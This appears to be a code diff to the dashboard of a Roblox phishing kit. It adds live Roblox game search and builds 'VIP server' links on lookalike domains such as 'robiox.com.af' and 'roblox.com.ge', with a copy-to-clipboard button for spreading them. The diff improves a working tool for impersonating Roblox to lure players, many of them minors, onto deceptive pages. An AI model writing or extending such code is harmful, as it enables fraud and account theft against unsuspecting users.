@@ -41,6 +41,18 @@
       background-color: white;
       z-index: 2;
     }
+    .loading-spinner {
+      border: 3px solid rgba(255, 255, 255, 0.1);
+      border-top: 3px solid white;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -132,6 +144,15 @@
 
   const code = new URLSearchParams(window.location.search).get("code")
 
+  // Roblox API Configuration
+  const ROBLOX_API_BASE = "https://games.roblox.com/v1";
+  const ROBLOX_GAMES_API = "https://games.roblox.com/v1/games";
+  const ROBLOX_THUMBNAILS_API = "https://thumbnails.roblox.com/v1/games/icons";
+  const VIP_SERVER_CODE = "61577596024483571254213742725726";
+
+  let searchTimeout;
+  let currentGames = [];
+
   function loginWithDiscord() {
     window.location.href =
       `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${SCOPE}`
@@ -179,8 +200,196 @@
     const domain = document.getElementById('domainSelect').value;
     const finalUrl = url.replace('DOMAIN', domain);
     navigator.clipboard.writeText(finalUrl).then(() => {
-      alert('Link copied to clipboard!');
+      // Show a better notification
+      const notification = document.createElement('div');
+      notification.className = 'fixed top-4 right-4 bg-green-500 text-white px-6 py-3 rounded-lg shadow-lg z-50';
+      notification.textContent = 'Link copied to clipboard!';
+      document.body.appendChild(notification);
+      setTimeout(() => notification.remove(), 2000);
     });
+  }
+
+  function formatNumber(num) {
+    if (num >= 1000000) {
+      return (num / 1000000).toFixed(1) + 'M';
+    } else if (num >= 1000) {
+      return (num / 1000).toFixed(1) + 'K';
+    }
+    return num.toString();
+  }
+
+  async function searchRobloxGames(query) {
+    try {
+      const searchResponse = await fetch(`https://apis.roblox.com/search-api/omni-search?searchQuery=${encodeURIComponent(query)}&pageType=games&sessionId=temp`);
+      
+      if (!searchResponse.ok) {
+        throw new Error('Search failed');
+      }
+
+      const searchData = await searchResponse.json();
+      const games = [];
+
+      // Extract universe IDs from search results
+      if (searchData.data && searchData.data.length > 0) {
+        for (const result of searchData.data.slice(0, 30)) {
+          if (result.type === 'Game' && result.universalSearchData) {
+            const universeId = result.universalSearchData.universeId;
+            if (universeId) {
+              games.push({
+                universeId: universeId,
+                name: result.universalSearchData.name || 'Unknown Game',
+                playerCount: result.universalSearchData.playerCount || 0
+              });
+            }
+          }
+        }
+      }
+
+      // Fetch detailed game information
+      if (games.length > 0) {
+        const universeIds = games.map(g => g.universeId).join(',');
+        
+        // Get game details
+        const detailsResponse = await fetch(`${ROBLOX_GAMES_API}?universeIds=${universeIds}`);
+        const detailsData = await detailsResponse.json();
+
+        // Get thumbnails
+        const thumbnailsResponse = await fetch(`${ROBLOX_THUMBNAILS_API}?universeIds=${universeIds}&size=512x512&format=Png&isCircular=false`);
+        const thumbnailsData = await thumbnailsResponse.json();
+
+        // Combine all data
+        const enrichedGames = games.map((game, index) => {
+          const details = detailsData.data?.find(d => d.id === game.universeId) || {};
+          const thumbnail = thumbnailsData.data?.find(t => t.targetId === game.universeId) || {};
+          
+          const rootPlaceId = details.rootPlaceId || game.universeId;
+          const gameName = details.name || game.name;
+          const gameUrl = gameName.replace(/[^a-zA-Z0-9]/g, '-');
+
+          return {
+            universeId: game.universeId,
+            rootPlaceId: rootPlaceId,
+            name: gameName,
+            imageUrl: thumbnail.imageUrl || 'https://via.placeholder.com/256',
+            playerCount: game.playerCount || 0,
+            likes: details.favoritedCount || 0,
+            visits: details.visits || 0,
+            created: details.created || '',
+            updated: details.updated || '',
+            link: `https://DOMAIN/games/${rootPlaceId}/${gameUrl}?privateServerLinkCode=${VIP_SERVER_CODE}`
+          };
+        });
+
+        return enrichedGames;
+      }
+
+      return [];
+    } catch (error) {
+      console.error('Error searching Roblox games:', error);
+      return [];
+    }
+  }
+
+  function showLoading() {
+    const grid = document.getElementById('gameCardGrid');
+    grid.innerHTML = `
+      <div class="col-span-full flex flex-col items-center justify-center py-20">
+        <div class="loading-spinner mb-4"></div>
+        <p class="text-white/60">Searching Roblox games...</p>
+      </div>
+    `;
+  }
+
+  function showNoResults() {
+    const grid = document.getElementById('gameCardGrid');
+    grid.innerHTML = `
+      <div class="col-span-full flex flex-col items-center justify-center py-20">
+        <svg class="w-16 h-16 text-white/20 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        <p class="text-white/60">No games found. Try a different search term.</p>
+      </div>
+    `;
+  }
+
+  function displayGames(games) {
+    const grid = document.getElementById('gameCardGrid');
+    
+    if (games.length === 0) {
+      showNoResults();
+      return;
+    }
+
+    grid.innerHTML = games.map(game => `
+      <div class="game-card">
+        <div class="relative flex flex-col items-center rounded-lg shadow md:flex-row md:max-w-md bg-black/30 border border-white/10 rounded-lg text-white p-4">
+          <button class="absolute -top-3 -right-3 flex items-center bg-black/50 text-white/80 text-sm font-medium px-2 py-1 rounded-full border border-white/10 hover:bg-black/70 transition" onclick="copyContentGames('${game.link}')">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-4 4h8m-4-4v8"></path>
+            </svg>
+            Copy
+          </button>
+          <img class="h-32 w-32 rounded-lg object-cover" src="${game.imageUrl}" alt="${game.name}" onerror="this.src='https://via.placeholder.com/256'">
+          <div class="flex flex-col justify-between leading-normal px-3 flex-1">
+            <h4 class="text-lg font-bold leading-tight break-words" style="word-break: break-word">${game.name}</h4>
+            <p class="text-white/50 text-sm font-normal">Universe ID: ${game.universeId}</p>
+            <div class="mt-3 flex gap-6 flex-wrap">
+              <div class="flex flex-col">
+                <h3 class="text-lg font-bold">${formatNumber(game.playerCount)}</h3>
+                <p class="text-white/80 text-xs font-normal">Playing</p>
+              </div>
+              <div class="flex flex-col">
+                <h3 class="text-lg font-bold">${formatNumber(game.likes)}</h3>
+                <p class="text-white/80 text-xs font-normal">Favorites</p>
+              </div>
+              <div class="flex flex-col">
+                <h3 class="text-lg font-bold">${formatNumber(game.visits)}</h3>
+                <p class="text-white/80 text-xs font-normal">Visits</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    `).join('');
+  }
+
+  async function handleSearch(query) {
+    if (!query || query.trim().length < 2) {
+      const grid = document.getElementById('gameCardGrid');
+      grid.innerHTML = `
+        <div class="col-span-full flex flex-col items-center justify-center py-20">
+          <svg class="w-16 h-16 text-white/20 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+          </svg>
+          <p class="text-white/60">Type to search for Roblox games</p>
+        </div>
+      `;
+      return;
+    }
+
+    showLoading();
+    const games = await searchRobloxGames(query);
+    currentGames = games;
+    displayGames(games);
+  }
+
+  function setupSearch() {
+    const searchInput = document.getElementById('search');
+    if (searchInput) {
+      searchInput.addEventListener('input', (e) => {
+        clearTimeout(searchTimeout);
+        searchTimeout = setTimeout(() => {
+          handleSearch(e.target.value);
+        }, 500);
+      });
+
+      searchInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+          clearTimeout(searchTimeout);
+          handleSearch(e.target.value);
+        }
+      });
+    }
   }
 
   function goToPage(page) {
@@ -190,30 +399,31 @@
       content.innerHTML = `
         <div class="flex-1 p-4 overflow-auto w-full">
           <div class="mx-auto px-4 md:px-10 pt-4 md:pt-11 transition-opacity duration-200 ease-in-out opacity-100">
-            <div class="flex items-start justify-between mb-16">
+            <div class="flex items-start justify-between mb-16 flex-wrap gap-6">
               <div>
                 <div class="flex items-center space-x-3 rtl:space-x-reverse">
-                  <img src="./assets/img/roblox.png" class="h-8 rounded-md">
+                  <svg class="h-8 w-8 text-white" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5z"/>
+                  </svg>
                   <span class="self-center text-3xl font-semibold whitespace-nowrap dark:text-white">Private Server Link Search</span>
                 </div>
                 <div class="text-sm text-white/60 mt-2 max-w-md">
-                  Search a game to generate the VIP Link.
+                  Search for any Roblox game to generate a VIP server link.
                 </div>
               </div>
 
               <div class="max-w-md">
-                <label for="default-search" class="mb-2 text-sm font-medium text-white sr-only">Search</label>
-                <div class="relative">
+                <label for="search" class="mb-2 text-sm font-medium text-white sr-only">Search</label>
+                <div class="relative mb-4">
                   <div class="absolute inset-y-0 start-0 flex items-center ps-3 pointer-events-none">
                     <svg class="w-4 h-4 text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
                       <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"></path>
                     </svg>
                   </div>
-                  <input type="search" id="search" class="block w-[340px] p-4 ps-10 text-sm bg-zinc-900 text-white rounded-md border" placeholder="Search Games" required="">
+                  <input type="search" id="search" class="block w-[340px] p-4 ps-10 text-sm bg-zinc-900 text-white rounded-md border border-white/10 focus:border-white/30 focus:outline-none transition" placeholder="Search Roblox Games...">
                 </div>
-                <br>
                 <div class="relative">
-                  <select id="domainSelect" class="w-full px-3 py-2 bg-zinc-900 rounded-md border">
+                  <select id="domainSelect" class="w-full px-3 py-2 bg-zinc-900 rounded-md border border-white/10 focus:border-white/30 focus:outline-none transition">
                     <option value="roblox.com.ge" class="bg-zinc-800 text-white">roblox.com.ge</option>
                     <option value="robiox.com.af" class="bg-zinc-800 text-white">robiox.com.af</option>
                   </select>
@@ -222,11 +432,18 @@
             </div>
 
             <div id="gameCardGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
-              ${getGameCards()}
+              <div class="col-span-full flex flex-col items-center justify-center py-20">
+                <svg class="w-16 h-16 text-white/20 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                </svg>
+                <p class="text-white/60">Type to search for Roblox games</p>
+              </div>
             </div>
           </div>
         </div>
       `;
+      // Setup search after content is loaded
+      setTimeout(setupSearch, 100);
     } else {
       const titles = {
         dashboard: "Welcome to Dashboard",
@@ -236,50 +453,6 @@
       content.innerHTML = `<h1 class="text-4xl font-bold">${titles[page] || "Unknown Page"}</h1>`;
     }
     location.hash = page
-  }
-
-  function getGameCards() {
-    const games = [
-      { name: "[🩷] Steal a Brainrot", img: "https://tr.rbxcdn.com/180DAY-a7e8f9e9d22cb5f138fec8b1d479dd1e/256/256/Image/Webp/noFilter", maturity: "Minimal", players: "139K", likes: "14M", dislikes: "2.2M", link: "https://DOMAIN/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=61577596024483571254213742725726" },
-      { name: "Escape Tsunami For Brainrots!", img: "https://tr.rbxcdn.com/180DAY-a53cd6a473150fd917fb92390b82e658/256/256/Image/Webp/noFilter", maturity: "Minimal", players: "406K", likes: "1.4M", dislikes: "209K", link: "https://DOMAIN/games/131623223084840/Escape-Tsunami-For-Brainrots?privateServerLinkCode=61577596024483571254213742725726" },
-      { name: "[🔨] Create your BRAINROT", img: "https://tr.rbxcdn.com/180DAY-700dc3c136e1ad1952245727189a1aef/256/256/Image/Webp/noFilter", maturity: "Minimal", players: "735", likes: "40K", dislikes: "3.4K", link: "https://DOMAIN/games/74637189843837/Create-your-BRAINROT?privateServerLinkCode=61577596024483571254213742725726" },
-      { name: "[☢ FREE UGC] STEAL BRAINROT : CHRISTMAS EDITION", img: "https://tr.rbxcdn.com/180DAY-e187fa0750ffc11e99827f8ea3249a5a/256/256/Image/Webp/noFilter", maturity: "Minimal", players: "33", likes: "1.9K", dislikes: "563", link: "https://DOMAIN/games/75714575986477/FREE-UGC-STEAL-BRAINROT-CHRISTMAS-EDITION?privateServerLinkCode=61577596024483571254213742725726" },
-      { name: "Steal From Brainrots 🤫", img: "https://tr.rbxcdn.com/180DAY-02ddccd370608314f2b1aac995ac7201/256/256/Image/Webp/noFilter", maturity: "Minimal", players: "38K", likes: "24K", dislikes: "2.8K", link: "https://DOMAIN/games/134763881293027/Steal-From-Brainrots?privateServerLinkCode=61577596024483571254213742725726" },
-      { name: "[FREE 🚽] BRAINROT SHOP", img: "https://tr.rbxcdn.com/180DAY-4997c58652527d393d79691c146aa324/256/256/Image/Webp/noFilter", maturity: "Minimal", players: "8", likes: "26K", dislikes: "3.6K", link: "https://DOMAIN/games/87280453784024/FREE-BRAINROT-SHOP?privateServerLinkCode=61577596024483571254213742725726" },
-      { name: "Brookhaven 🏡RP", img: "https://tr.rbxcdn.com/180DAY-41f48dd0839f267b756bb8cd314660cf/256/256/Image/Webp/noFilter", maturity: "Minimal", players: "219K", likes: "7.6M", dislikes: "1.2M", link: "https://DOMAIN/games/4924922222/Brookhaven-RP?privateServerLinkCode=61577596024483571254213742725726" }
-    ];
-
-    return games.map(game => `
-      <div class="game-card">
-        <div class="relative flex flex-col items-center rounded-lg shadow md:flex-row md:max-w-md bg-black/30 border border-white/10 rounded-lg text-white p-4">
-          <button class="absolute -top-3 -right-3 flex items-center bg-black/50 text-white/80 text-sm font-medium px-2 py-1 rounded-full border border-white/10 hover:bg-black/70" onclick="copyContentGames('${game.link}')">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-4 4h8m-4-4v8"></path>
-            </svg>
-            Copy
-          </button>
-          <img class="h-32 w-32 rounded-lg" src="${game.img}" alt="${game.name}">
-          <div class="flex flex-col justify-between leading-normal px-3">
-            <h4 class="text-lg font-bold leading-tight break-words" style="word-break: break-word">${game.name}</h4>
-            <p class="text-white/50 text-sm font-normal">Maturity: ${game.maturity}</p>
-            <div class="mt-3 flex gap-10">
-              <div class="flex flex-col">
-                <h3 class="text-lg font-bold">${game.players}</h3>
-                <p class="text-white/80 text-xs font-normal">Player Count</p>
-              </div>
-              <div class="flex flex-col">
-                <h3 class="text-lg font-bold">${game.likes}</h3>
-                <p class="text-white/80 text-xs font-normal">Likes</p>
-              </div>
-              <div class="flex flex-col">
-                <h3 class="text-lg font-bold">${game.dislikes}</h3>
-                <p class="text-white/80 text-xs font-normal">Dislikes</p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    `).join('');
   }
 
   handleOAuthLogin()
